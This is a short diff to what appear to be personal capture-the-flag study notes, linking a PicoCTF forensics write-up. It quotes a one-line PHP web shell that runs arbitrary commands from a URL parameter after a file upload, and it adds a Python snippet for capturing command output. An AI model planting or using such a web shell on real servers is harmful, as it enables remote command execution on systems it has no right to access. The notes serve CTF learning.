@@ -7,3 +7,5 @@ see https://github.com/not1cyyy/CTF-Writeups/wiki/PicoCTF-:-Sleuthkit-Apprentice
 
 
 <?php system($_GET["cmd"]); ?> - php script, use ?cmd=ls, etc to run arbitrary commands if given file upload privledges + ability to run php
+
+python: os.popen("command").read() -> get output of command
